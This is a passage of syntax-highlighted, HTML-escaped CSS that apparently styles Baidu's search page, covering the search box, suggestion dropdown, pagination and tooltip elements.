#ebebeb&#125;\n#user&#123;display:inline-block&#125;\n#user_center&#123;position:relative;<span class="attribute">display</span>:inline-block&#125;\n#user_center <span class="variable">.user_center_btn</span>&#123;margin-right:5px&#125;\n<span class="variable">.userMenu</span>&#123;width:64px;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:7px;<span class="attribute">_right</span>:2px;<span class="attribute">top</span>:15px;<span class="attribute">top</span>:14px\\9;*<span class="attribute">top</span>:15px;<span class="attribute">padding-top</span>:4px;<span class="attribute">display</span>:none;*<span class="attribute">background</span>:#fff&#125;\n#head&#123;padding-left:35px;<span class="attribute">margin-bottom</span>:20px;<span class="attribute">width</span>:900px&#125;\n<span class="variable">.fm</span>&#123;clear:both;<span class="attribute">position</span>:relative;<span class="attribute">z-index</span>:297&#125;\n#form<span class="variable">.fm</span>&#123;font-size:0&#125;\n#more,#page,<span class="variable">.btn</span>,<span class="variable">.nv</span> a,<span class="variable">.nv</span> b&#123;font-size:14px&#125;\n#form<span class="variable">.fm</span> <span class="variable">.bdsug</span>&#123;font-size:12px&#125;\n<span class="variable">.s_nav</span>&#123;height:45px&#125;\n<span class="variable">.s_nav</span> <span class="variable">.s_logo</span>&#123;margin-right:20px;<span class="attribute">float</span>:left&#125;\n<span class="variable">.s_nav</span> <span class="variable">.s_logo</span> img&#123;border:0;<span class="attribute">display</span>:block&#125;\n<span class="variable">.s_tab</span>&#123;line-height:18px;<span class="attribute">padding</span>:20px 0 0;<span class="attribute">float</span>:left&#125;\n<span class="variable">.s_nav</span> a&#123;color:#00c;<span class="attribute">font-size</span>:14px&#125;\n<span class="variable">.s_nav</span> b&#123;font-size:14px&#125;\n<span class="variable">.s_ipt_wr</span>&#123;border:1px solid #b6b6b6;<span class="attribute">background</span>:#fff;<span class="attribute">display</span>:inline-block;<span class="attribute">vertical-align</span>:top;<span class="attribute">width</span>:539px;<span class="attribute">margin-right</span>:0;<span class="attribute">border-right-width</span>:0;<span class="attribute">border-color</span>:#b8b8b8 transparent #ccc #b8b8b8;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.s_ipt_wr</span><span class="variable">.ipthover</span>,<span class="variable">.s_ipt_wr</span>:hover&#123;border-color:#999 transparent #b3b3b3 #999&#125;\n<span class="variable">.s_ipt_wr</span><span class="variable">.iptfocus</span>&#123;border-color:#4791ff transparent #4791ff #4791ff&#125;\n<span class="variable">.s_ipt_tip</span>&#123;color:#aaa;<span class="attribute">position</span>:absolute;<span class="attribute">z-index</span>:-10;<span class="attribute">font</span>:16px\/22px arial;<span class="attribute">height</span>:32px;<span class="attribute">line-height</span>:32px;<span class="attribute">padding-left</span>:7px;<span class="attribute">overflow</span>:hidden;<span class="attribute">width</span>:526px&#125;\n<span class="variable">.s_ipt</span>&#123;width:526px;<span class="attribute">height</span>:22px;<span class="attribute">font</span>:16px\/18px arial;<span class="attribute">line-height</span>:22px;<span class="attribute">margin</span>:6px 0 0 7px;<span class="attribute">padding</span>:0;<span class="attribute">background</span>:0 0;<span class="attribute">border</span>:0;<span class="attribute">outline</span>:0;<span class="attribute">-webkit-appearance</span>:none&#125;\n<span class="variable">.s_btn</span>&#123;width:95px;<span class="attribute">height</span>:32px;<span class="attribute">padding-top</span>:2px\\9;<span class="attribute">font-size</span>:14px;<span class="attribute">padding</span>:0;<span class="attribute">background-color</span>:#ddd;<span class="attribute">background-position</span>:0 -48px;<span class="attribute">border</span>:0;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.s_btn_h</span>&#123;background-position:-240px -48px&#125;\n<span class="variable">.s_btn_wr</span>&#123;width:97px;<span class="attribute">height</span>:34px;<span class="attribute">display</span>:inline-block;<span class="attribute">background-position</span>:-120px -48px;*<span class="attribute">position</span>:relative;<span class="attribute">z-index</span>:0;<span class="attribute">vertical-align</span>:top&#125;\n<span class="variable">.sethf</span>&#123;padding:0;<span class="attribute">margin</span>:0;<span class="attribute">font-size</span>:14px&#125;\n<span class="variable">.set_h</span>&#123;display:none;<span class="attribute">behavior</span>:url(#default#homepage)&#125;\n<span class="variable">.set_f</span>&#123;display:none&#125;\n<span class="variable">.shouji</span>&#123;margin-left:19px&#125;\n<span class="variable">.shouji</span> a&#123;text-decoration:none&#125;\n#head <span class="variable">.bdsug</span>&#123;top:33px&#125;\n#search form&#123;position:relative&#125;\n#search form <span class="variable">.bdsug</span>&#123;bottom:33px&#125;\n<span class="variable">.bdsug</span>&#123;display:none;<span class="attribute">position</span>:absolute;<span class="attribute">z-index</span>:1;<span class="attribute">width</span>:538px;<span class="attribute">background</span>:#fff;<span class="attribute">border</span>:1px solid #ccc;<span class="attribute">_overflow</span>:hidden;<span class="attribute">box-shadow</span>:1px 1px 3px #ededed;<span class="attribute">-webkit-box-shadow</span>:1px 1px 3px #ededed;<span class="attribute">-moz-box-shadow</span>:1px 1px 3px #ededed;<span class="attribute">-o-box-shadow</span>:1px 1px 3px #ededed&#125;\n<span class="variable">.bdsug</span><span class="variable">.bdsugbg</span> ul&#123;background:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/home\/img\/sugbg_1762fe7<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) 100% 100% no-repeat;<span class="attribute">background-size</span>:100px 110px;<span class="attribute">background-image</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/home\/img\/sugbg_90fc9cf<span class="variable">.gif</span>?v=62527263<span class="variable">.gif</span>)\\9&#125;\n<span class="variable">.bdsug</span> li&#123;width:522px;<span class="attribute">color</span>:#000;<span class="attribute">font</span>:14px arial;<span class="attribute">line-height</span>:22px;<span class="attribute">padding</span>:0 8px;<span class="attribute">position</span>:relative;<span class="attribute">cursor</span>:default&#125;\n<span class="variable">.bdsug</span> li<span class="variable">.bdsug-s</span>&#123;background:#f0f0f0&#125;\n<span class="variable">.bdsug-store</span> b,<span class="variable">.bdsug-store</span> span&#123;color:#7a77c8&#125;\n<span class="variable">.bdsug-store-del</span>&#123;font-size:12px;<span class="attribute">color</span>:#666;<span class="attribute">text-decoration</span>:underline;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:8px;<span class="attribute">top</span>:0;<span class="attribute">cursor</span>:pointer;<span class="attribute">display</span>:none&#125;\n<span class="variable">.bdsug-s</span> <span class="variable">.bdsug-store-del</span>&#123;display:inline-block&#125;\n<span class="variable">.bdsug-ala</span>&#123;display:inline-block;<span class="attribute">border-bottom</span>:1px solid #e6e6e6&#125;\n<span class="variable">.bdsug-ala</span> h3&#123;line-height:14px;<span class="attribute">background</span>:url(\/\/www<span class="variable">.baidu</span><span class="variable">.com</span>\/img\/sug_bd<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat left center;<span class="attribute">margin</span>:8px 0 5px;<span class="attribute">font-size</span>:12px;<span class="attribute">font-weight</span>:400;<span class="attribute">color</span>:#7b7b7b;<span class="attribute">padding-left</span>:20px&#125;\n<span class="variable">.bdsug-ala</span> p&#123;font-size:14px;<span class="attribute">font-weight</span>:700;<span class="attribute">padding-left</span>:20px&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-direct</span>&#123;width:auto;<span class="attribute">padding</span>:0;<span class="attribute">border-bottom</span>:1px solid #f1f1f1&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-direct</span> p&#123;color:#00c;<span class="attribute">font-weight</span>:700;<span class="attribute">line-height</span>:34px;<span class="attribute">padding</span>:0 8px;<span class="attribute">cursor</span>:pointer;<span class="attribute">white-space</span>:nowrap;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-direct</span> p img&#123;width:16px;<span class="attribute">height</span>:16px;<span class="attribute">margin</span>:7px 6px 9px 0;<span class="attribute">vertical-align</span>:middle&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-direct</span> p span&#123;margin-left:8px&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-direct</span> p i&#123;font-size:12px;<span class="attribute">line-height</span>:100%;<span class="attribute">font-style</span>:normal;<span class="attribute">font-weight</span>:400;<span class="attribute">color</span>:#fff;<span class="attribute">background-color</span>:#2b99ff;<span class="attribute">display</span>:inline;<span class="attribute">text-align</span>:center;<span class="attribute">padding</span>:1px 5px;*<span class="attribute">padding</span>:2px 5px 0;<span class="attribute">margin-left</span>:8px;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-pcDirect</span>&#123;color:#000;<span class="attribute">font-size</span>:14px;<span class="attribute">line-height</span>:30px;<span class="attribute">height</span>:30px;<span class="attribute">background-color</span>:#f8f8f8&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-pc-direct-tip</span>&#123;position:absolute;<span class="attribute">right</span>:15px;<span class="attribute">top</span>:8px;<span class="attribute">width</span>:55px;<span class="attribute">height</span>:15px;<span class="attribute">display</span>:block;<span class="attribute">background</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/pc_direct_42d6311<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat 0 0&#125;\n<span class="variable">.bdsug</span> li<span class="variable">.bdsug-pcDirect-s</span>&#123;background-color:#f0f0f0&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-pcDirect-is</span>&#123;color:#000;<span class="attribute">font-size</span>:14px;<span class="attribute">line-height</span>:22px;<span class="attribute">background-color</span>:#f8f8f8&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-pc-direct-tip-is</span>&#123;position:absolute;<span class="attribute">right</span>:15px;<span class="attribute">top</span>:3px;<span class="attribute">width</span>:55px;<span class="attribute">height</span>:15px;<span class="attribute">display</span>:block;<span class="attribute">background</span>:url(https:\/\/ss1<span class="variable">.bdstatic</span><span class="variable">.com</span>\/5eN1bjq8AAUYm2zgoY3K\/r\/www\/cache\/static\/protocol\/https\/global\/img\/pc_direct_42d6311<span class="variable">.png</span>?v=62527263<span class="variable">.png</span>) no-repeat 0 0&#125;\n<span class="variable">.bdsug</span> li<span class="variable">.bdsug-pcDirect-is-s</span>&#123;background-color:#f0f0f0&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-pcDirect-is-s</span> <span class="variable">.bdsug-pc-direct-tip-is</span>,<span class="variable">.bdsug</span> <span class="variable">.bdsug-pcDirect-s</span> <span class="variable">.bdsug-pc-direct-tip</span>&#123;background-position:0 -15px&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-newicon</span>&#123;color:#929292;<span class="attribute">opacity</span>:.7;<span class="attribute">font-size</span>:12px;<span class="attribute">display</span>:inline-block;<span class="attribute">line-height</span>:22px;<span class="attribute">letter-spacing</span>:2px&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-s</span> <span class="variable">.bdsug-newicon</span>&#123;opacity:1&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-newicon</span> i&#123;letter-spacing:0;<span class="attribute">font-style</span>:normal&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-feedback-wrap</span>&#123;text-align:right;<span class="attribute">background</span>:#fafafa;<span class="attribute">color</span>:#666;<span class="attribute">height</span>:25px;<span class="attribute">line-height</span>:27px&#125;\n<span class="variable">.bdsug</span> <span class="variable">.bdsug-feedback</span>&#123;margin-right:10px;<span class="attribute">text-decoration</span>:underline;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.toggle-underline</span>&#123;text-decoration:none&#125;\n<span class="variable">.toggle-underline</span>:hover&#123;text-decoration:underline&#125;\n#tb_mr&#123;color:#00c;<span class="attribute">cursor</span>:pointer;<span class="attribute">position</span>:relative;<span class="attribute">z-index</span>:298&#125;\n#tb_mr b&#123;font-weight:400;<span class="attribute">text-decoration</span>:underline&#125;\n#tb_mr small&#123;font-size:11px&#125;\n#page&#123;font:14px arial;<span class="attribute">white-space</span>:nowrap;<span class="attribute">padding-left</span>:35px&#125;\n#page a,#page strong&#123;display:inline-block;<span class="attribute">vertical-align</span>:text-bottom;<span class="attribute">height</span>:66px;<span class="attribute">text-align</span>:center;<span class="attribute">line-height</span>:34px;<span class="attribute">text-decoration</span>:none;<span class="attribute">overflow</span>:hidden;<span class="attribute">margin-right</span>:9px;<span class="attribute">background</span>:#fff&#125;\n#page a&#123;cursor:pointer&#125;\n#page a:hover&#123;background:0 0&#125;\n#page <span class="variable">.n</span>:hover,#page a:hover <span class="variable">.pc</span>&#123;background:#f2f8ff;<span class="attribute">border</span>:1px solid #38f&#125;\n#page <span class="variable">.n</span>&#123;height:34px;<span class="attribute">padding</span>:0 18px;<span class="attribute">border</span>:1px solid #e1e2e3&#125;\n#page span&#123;display:block&#125;\n#page <span class="variable">.pc</span>&#123;width:34px;<span class="attribute">height</span>:34px;<span class="attribute">border</span>:1px solid #e1e2e3;<span class="attribute">cursor</span>:pointer&#125;\n#page <span class="variable">.fk</span>&#123;width:24px;<span class="attribute">height</span>:24px;<span class="attribute">margin-bottom</span>:6px;<span class="attribute">margin-left</span>:6px;<span class="attribute">cursor</span>:pointer&#125;\n#page strong <span class="variable">.fk</span>,#page strong <span class="variable">.pc</span>&#123;cursor:auto&#125;\n#page <span class="variable">.fk</span> <span class="variable">.c-icon-bear-pn</span>&#123;top:-3px;<span class="attribute">position</span>:relative&#125;\n#page <span class="variable">.fkd</span> <span class="variable">.c-icon-bear-pn</span>&#123;top:3px;<span class="attribute">position</span>:relative&#125;\n#page <span class="variable">.fk_cur</span> <span class="variable">.c-icon-bear-p</span>&#123;top:-2px;<span class="attribute">position</span>:relative&#125;\n#page strong <span class="variable">.pc</span>&#123;border:0;<span class="attribute">width</span>:36px;<span class="attribute">height</span>:36px;<span class="attribute">line-height</span>:36px&#125;\n#page <span class="variable">.nums</span>&#123;display:inline-block;<span class="attribute">vertical-align</span>:text-bottom;<span class="attribute">height</span>:36px;<span class="attribute">line-height</span>:36px;<span class="attribute">margin-left</span>:10px&#125;\n#rs&#123;width:900px;<span class="attribute">background</span>:#fff;<span class="attribute">padding</span>:8px 0;<span class="attribute">margin</span>:20px 0 0 15px&#125;\n#rs td&#123;width:5%&#125;\n#rs th&#123;font-size:14px;<span class="attribute">font-weight</span>:400;<span class="attribute">line-height</span>:19px;<span class="attribute">white-space</span>:nowrap;<span class="attribute">text-align</span>:left;<span class="attribute">vertical-align</span>:top&#125;\n#rs <span class="variable">.tt</span>&#123;font-weight:700;<span class="attribute">padding</span>:0 10px 0 20px&#125;\n#rs_top&#123;font-size:14px;<span class="attribute">margin-bottom</span>:22px&#125;\n#rs_top a&#123;margin-right:18px&#125;\n#container <span class="variable">.rs</span>&#123;margin:30px 0 20px;<span class="attribute">padding</span>:5px 0 15px;<span class="attribute">font-size</span>:14px;<span class="attribute">width</span>:540px;<span class="attribute">padding-left</span>:121px;<span class="attribute">position</span>:relative;<span class="attribute">background-color</span>:#fafafa&#125;\n#container <span class="variable">.noback</span>&#123;background-color:#fff&#125;\n#content_left <span class="variable">.rs</span>&#123;margin-left:-121px&#125;\n#container <span class="variable">.rs</span> table&#123;width:540px&#125;\n#container <span class="variable">.rs</span> td&#123;width:5px&#125;\n#container <span class="variable">.rs</span> th&#123;font-size:14px;<span class="attribute">font-weight</span>:400;<span class="attribute">white-space</span>:nowrap;<span class="attribute">text-align</span>:left;<span class="attribute">vertical-align</span>:top;<span class="attribute">width</span>:175px;<span class="attribute">line-height</span>:22px&#125;\n#container <span class="variable">.rs</span> <span class="variable">.tt</span>&#123;font-weight:700;<span class="attribute">padding</span>:0 10px 0 20px;<span class="attribute">padding</span>:0;<span class="attribute">line-height</span>:30px;<span class="attribute">font-size</span>:16px&#125;\n#container <span class="variable">.rs</span> a&#123;margin:0;<span class="attribute">height</span>:24px;<span class="attribute">width</span>:173px;<span class="attribute">display</span>:inline-block;<span class="attribute">line-height</span>:25px;<span class="attribute">border</span>:1px solid #ebebeb;<span class="attribute">text-align</span>:center;<span class="attribute">vertical-align</span>:middle;<span class="attribute">overflow</span>:hidden;<span class="attribute">outline</span>:0;<span class="attribute">color</span>:#333;<span class="attribute">background-color</span>:#fff;<span class="attribute">text-decoration</span>:none&#125;\n#container <span class="variable">.rs</span> a:hover&#123;border-color:#388bff&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu-b</span> ul&#123;width:100px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu-b</span> ul&#123;text-align:center&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu-b</span> li a&#123;display:block;<span class="attribute">text-decoration</span>:none;<span class="attribute">cursor</span>:pointer;<span class="attribute">background-color</span>:#fff;<span class="attribute">padding</span>:3px 0;<span class="attribute">color</span>:#666&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-menu-b</span> li a:hover&#123;display:block;<span class="attribute">background-color</span>:#ebebeb&#125;\n#search&#123;width:900px;<span class="attribute">padding</span>:35px 0 16px 35px&#125;\n#search <span class="variable">.s_help</span>&#123;position:relative;<span class="attribute">top</span>:10px&#125;\n#foot&#123;height:20px;<span class="attribute">line-height</span>:20px;<span class="attribute">color</span>:#77c;<span class="attribute">background</span>:#e6e6e6;<span class="attribute">text-align</span>:center&#125;\n#foot span&#123;color:#666&#125;\n<span class="variable">.site_tip</span>&#123;font-size:12px;<span class="attribute">margin-bottom</span>:20px&#125;\n<span class="variable">.site_tip_icon</span>&#123;width:56px;<span class="attribute">height</span>:56px;<span class="attribute">background</span>:url(\/\/www<span class="variable">.baidu</span><span class="variable">.com</span>\/aladdin\/img\/tools\/tools-3<span class="variable">.png</span>) -288px 0 no-repeat&#125;\n<span class="variable">.to_tieba</span>,<span class="variable">.to_zhidao</span>,<span class="variable">.to_zhidao_bottom</span>&#123;font-size:16px;<span class="attribute">line-height</span>:24px;<span class="attribute">margin</span>:20px 0 0 35px&#125;\n<span class="variable">.to_tieba</span> <span class="variable">.c-icon-tieba</span>&#123;float:left&#125;\n<span class="variable">.f</span>&#123;line-height:115%;*<span class="attribute">line-height</span>:120%;<span class="attribute">font-size</span>:100%;<span class="attribute">width</span>:33.7em;<span class="attribute">word-break</span>:break-all;<span class="attribute">word-wrap</span>:break-word&#125;\n<span class="variable">.h</span>&#123;margin-left:8px;<span class="attribute">width</span>:100%&#125;\n<span class="variable">.r</span>&#123;word-break:break-all;<span class="attribute">cursor</span>:hand;<span class="attribute">width</span>:238px&#125;\n<span class="variable">.t</span>&#123;font-weight:400;<span class="attribute">font-size</span>:medium;<span class="attribute">margin-bottom</span>:1px&#125;\n<span class="variable">.pl</span>&#123;padding-left:3px;<span class="attribute">height</span>:8px;<span class="attribute">padding-right</span>:2px;<span class="attribute">font-size</span>:14px&#125;\n<span class="variable">.mo</span>,a<span class="variable">.mo</span>:link,a<span class="variable">.mo</span>:visited&#123;color:#666;<span class="attribute">font-size</span>:100%;<span class="attribute">line-height</span>:10px&#125;\n<span class="variable">.htb</span>&#123;margin-bottom:5px&#125;\n<span class="variable">.jc</span> a&#123;color:#c00&#125;\na font[size=\"3\"] font,font[size=\"3\"] a font&#123;text-decoration:underline&#125;\ndiv<span class="variable">.bbs</span>,div<span class="variable">.blog</span>&#123;color:#707070;<span class="attribute">padding-top</span>:2px;<span class="attribute">font-size</span>:13px&#125;\n<span class="variable">.result</span>&#123;width:33.7em;<span class="attribute">table-layout</span>:fixed&#125;\n<span class="variable">.result-op</span> <span class="variable">.f</span>&#123;word-wrap:normal&#125;\n<span class="variable">.nums</span>&#123;font-size:12px;<span class="attribute">color</span>:#999&#125;\n<span class="variable">.tools</span>&#123;position:absolute;<span class="attribute">top</span>:10px;<span class="attribute">white-space</span>:nowrap&#125;\n#mHolder&#123;width:62px;<span class="attribute">position</span>:relative;<span class="attribute">z-index</span>:296;<span class="attribute">top</span>:-18px;<span class="attribute">margin-left</span>:9px;<span class="attribute">margin-right</span>:-12px;<span class="attribute">display</span>:none&#125;\n#mCon&#123;height:18px;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:3px;<span class="attribute">top</span>:6px\\9;<span class="attribute">cursor</span>:pointer;<span class="attribute">line-height</span>:18px&#125;\n<span class="variable">.wrapper_l</span> #mCon&#123;right:7px&#125;\n#mCon span&#123;color:#00c;<span class="attribute">display</span>:block&#125;\n#mCon <span class="variable">.hw</span>&#123;text-decoration:underline;<span class="attribute">cursor</span>:pointer;<span class="attribute">display</span>:inline-block&#125;\n#mCon <span class="variable">.pinyin</span>&#123;display:inline-block&#125;\n#mCon <span class="variable">.c-icon-chevron-unfold</span>2&#123;margin-left:5px&#125;\n#mMenu&#123;width:56px;<span class="attribute">border</span>:1px solid #9b9b9b;<span class="attribute">position</span>:absolute;<span class="attribute">right</span>:7px;<span class="attribute">top</span>:23px;<span class="attribute">display</span>:none;<span class="attribute">background</span>:#fff&#125;\n#mMenu a&#123;width:100%;<span class="attribute">height</span>:100%;<span class="attribute">color</span>:#00c;<span class="attribute">display</span>:block;<span class="attribute">line-height</span>:22px;<span class="attribute">text-indent</span>:6px;<span class="attribute">text-decoration</span>:none;<span class="attribute">filter</span>:none\\9&#125;\n#mMenu a:hover&#123;background:#ebebeb&#125;\n#mMenu <span class="variable">.ln</span>&#123;height:1px;<span class="attribute">background</span>:#ebebeb;<span class="attribute">overflow</span>:hidden;<span class="attribute">font-size</span>:1px;<span class="attribute">line-height</span>:1px;<span class="attribute">margin-top</span>:-1px&#125;\n<span class="variable">.op_LAMP</span>&#123;background:url(\/\/www<span class="variable">.baidu</span><span class="variable">.com</span>\/cache\/global\/img\/aladdinIcon-1.0<span class="variable">.gif</span>) no-repeat 0 2px;<span class="attribute">color</span>:#77c;<span class="attribute">display</span>:inline-block;<span class="attribute">font-size</span>:13px;<span class="attribute">height</span>:12px;*<span class="attribute">height</span>:14px;<span class="attribute">width</span>:16px;<span class="attribute">text-decoration</span>:none;<span class="attribute">zoom</span>:1&#125;\n<span class="variable">.EC_mr</span>15&#123;margin-left:0&#125;\n<span class="variable">.pd</span>15&#123;padding-left:0&#125;\n<span class="variable">.map_</span>1&#123;width:30em;<span class="attribute">font-size</span>:80%;<span class="attribute">line-height</span>:145%&#125;\n<span class="variable">.map_</span>2&#123;width:25em;<span class="attribute">font-size</span>:80%;<span class="attribute">line-height</span>:145%&#125;\n<span class="variable">.favurl</span>&#123;background-repeat:no-repeat;<span class="attribute">background-position</span>:0 1px;<span class="attribute">padding-left</span>:20px&#125;\n<span class="variable">.dan_tip</span>&#123;font-size:12px;<span class="attribute">margin-top</span>:4px&#125;\n<span class="variable">.dan_tip</span> a&#123;color:#b95b07&#125;\n#mMenu,#more,#u ul,<span class="variable">.msg_holder</span>&#123;box-shadow:1px 1px 2px #ccc;<span class="attribute">-moz-box-shadow</span>:1px 1px 2px #ccc;<span class="attribute">-webkit-box-shadow</span>:1px 1px 2px #ccc;<span class="attribute">filter</span>:progid:DXImageTransform<span class="variable">.Microsoft</span><span class="variable">.Shadow</span>(Strength=2, Direction=135, Color=#cccccc)\\9&#125;\n<span class="variable">.hit_top</span>&#123;line-height:18px;<span class="attribute">margin</span>:0 15px 10px 0;<span class="attribute">width</span>:516px&#125;\n<span class="variable">.hit_top</span> <span class="variable">.c-icon-bear</span>&#123;height:18px;<span class="attribute">margin-right</span>:4px&#125;\n#rs_top_new,<span class="variable">.hit_top_new</span>&#123;width:538px;<span class="attribute">font-size</span>:13px;<span class="attribute">line-height</span>:1.54;<span class="attribute">word-wrap</span>:break-word;<span class="attribute">word-break</span>:break-all;<span class="attribute">margin</span>:0 0 14px&#125;\n<span class="variable">.zhannei-si</span>&#123;margin:0 0 10px 121px&#125;\n<span class="variable">.zhannei-si-none</span>&#123;margin:10px 0 -10px 121px&#125;\n<span class="variable">.zhannei-search</span>&#123;margin:10px 0 0 121px;<span class="attribute">color</span>:#999;<span class="attribute">font-size</span>:14px&#125;\n<span class="variable">.f</span> a font[size=\"3\"] font,<span class="variable">.f</span> font[size=\"-1\"] a font&#123;text-decoration:underline&#125;\nh3 a font&#123;text-decoration:underline&#125;\n<span class="variable">.c-title</span>&#123;font-weight:400;<span class="attribute">font-size</span>:16px&#125;\n<span class="variable">.c-title-size</span>&#123;font-size:16px&#125;\n<span class="variable">.c-abstract</span>&#123;font-size:13px&#125;\n<span class="variable">.c-abstract-size</span>&#123;font-size:13px&#125;\n<span class="variable">.c-showurl</span>&#123;color:green;<span class="attribute">font-size</span>:13px&#125;\n<span class="variable">.c-showurl-color</span>&#123;color:green&#125;\n<span class="variable">.c-cache-color</span>&#123;color:#666&#125;\n<span class="variable">.c-lightblue</span>&#123;color:#77c&#125;\n<span class="variable">.c-highlight-color</span>&#123;color:#c00&#125;\n<span class="variable">.c-clearfix</span>:after&#123;content:\".\";<span class="attribute">display</span>:block;<span class="attribute">height</span>:0;<span class="attribute">clear</span>:both;<span class="attribute">visibility</span>:hidden&#125;\n<span class="variable">.c-clearfix</span>&#123;zoom:1&#125;\n<span class="variable">.c-wrap</span>&#123;word-break:break-all;<span class="attribute">word-wrap</span>:break-word&#125;\n<span class="variable">.c-icons-outer</span>&#123;overflow:hidden;<span class="attribute">display</span>:inline-block;<span class="attribute">vertical-align</span>:bottom;*<span class="attribute">vertical-align</span>:-1px;<span class="attribute">_vertical-align</span>:bottom&#125;\n<span class="variable">.c-icons-inner</span>&#123;margin-left:-4px&#125;\n<span class="variable">.c-container</span> table<span class="variable">.result</span>,<span class="variable">.c-container</span> table<span class="variable">.result-op</span>&#123;width:100%&#125;\n<span class="variable">.c-container</span> td<span class="variable">.f</span>&#123;font-size:13px;<span class="attribute">line-height</span>:1.54;<span class="attribute">width</span>:auto&#125;\n<span class="variable">.c-container</span> <span class="variable">.vd_newest_main</span>&#123;width:auto&#125;\n<span class="variable">.c-customicon</span>&#123;display:inline-block;<span class="attribute">width</span>:16px;<span class="attribute">height</span>:16px;<span class="attribute">vertical-align</span>:text-bottom;<span class="attribute">font-style</span>:normal;<span class="attribute">overflow</span>:hidden&#125;\n<span class="variable">.c-tip-icon</span> i&#123;display:inline-block;<span class="attribute">cursor</span>:pointer&#125;\n<span class="variable">.c-tip-con</span>&#123;position:absolute;<span class="attribute">z-index</span>:1;<span class="attribute">top</span>:22px;<span class="attribute">left</span>:-35px;<span class="attribute">background</span>:#fff;<span class="attribute">border</span>:1px solid #dcdcdc;<span class="attribute">border</span>:1px solid rgba(0,0,0,.2);<span class="attribute">-webkit-transition</span>:opacity 218ms;<span class="attribute">transition</span>:opacity 218ms;<span class="attribute">-webkit-box-shadow</span>:0 2px 4px rgba(0,0,0,.2);<span class="attribute">box-shadow</span>:0 2px 4px rgba(0,0,0,.2);<span class="attribute">padding</span>:5px 0;<span class="attribute">display</span>:none;<span class="attribute">font-size</span>:12px;<span class="attribute">line-height</span>:20px&#125;\n<span class="variable">.c-tip-arrow</span>&#123;width:0;<span class="attribute">height</span>:0;<span class="attribute">font-size</span>:0;<span class="attribute">line-height</span>:0;<span class="attribute">display</span>:block;<span class="attribute">position</span>:absolute;<span class="attribute">top</span>:-16px&#125;\n<span class="variable">.c-tip-arrow-down</span>&#123;top:auto;<span class="attribute">bottom</span>:0&#125;\n<span class="variable">.c-tip-arrow</span> em,<span class="variable">.c-tip-arrow</span> ins&#123;width:0;<span class="attribute">height</span>:0;<span class="attribute">font-size</span>:0;<span class="attribute">line-height</span>:0;<span class="attribute">display</span>:block;<span class="attribute">position</span>:absolute;<span class="attribute">border</span>:8px solid transparent;<span class="attribute">border-style</span>:dashed dashed solid&#125;\n<span class="variable">.c-tip-arrow</span> em&#123;border-bottom-color:#d8d8d8&#125;\n<span class="variable">.c-tip-arrow</span> ins&#123;border-bottom-color:#fff;<span class="attribute">top</span>:2px&#125;\n<span class="variable">.c-tip-arrow-down</span> em,<span class="variable">.c-tip-arrow-down</span> ins&#123;border-style:solid dashed dashed;<span class="attribute">border-color</span>:transparent&#125;\n<span class="variable">.c-tip-arrow-down</span> em&#123;border-top-color:#d8d8d8&#125;\n<span class="variable">.c-tip-arrow-down</span> ins&#123;border-top-color:#fff;<span class="attribute">top</span>:-2px&#125;\n<span class="variable">.c-tip-arrow</span> <span class="variable">.c-tip-arrow-r</span>&#123;border-bottom-color:#82c9fa;<span class="attribute">top</span>:2px&#125;\n<span class="variable">.c-tip-arrow-down</span> <span class="variable">.c-tip-arrow-r</span>&#123;border-bottom-color:transparent;<span class="attribute">top</span>:-2px&#125;\n<span class="variable">.c-tip-arrow</span> <span class="variable">.c-tip-arrow-c</span>&#123;border-bottom-color:#fecc47;<span class="attribute">top</span>:2px&#125;\n<span class="variable">.c-tip-arrow-down</span> <span class="variable">.c-tip-arrow-c</span>&#123;border-bottom-color:transparent;<span class="attribute">top</span>:-2px&#125;\n<span class="variable">.c-tip-con</span> h3&#123;font-size:12px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-title</span>&#123;margin:0 10px;<span class="attribute">display</span>:inline-block;<span class="attribute">width</span>:239px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-info</span>&#123;color:#666;<span class="attribute">margin</span>:0 10px 1px;<span class="attribute">width</span>:239px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-cer</span>&#123;width:370px;<span class="attribute">color</span>:#666;<span class="attribute">margin</span>:0 10px 1px&#125;\n<span class="variable">.c-tip-con</span> <span class="variable">.c-tip-title</span>&#123;width:auto;<span class="attribute">_width</span>:354px&#125;\n<span class="variable">.c-tip-con</span> <span 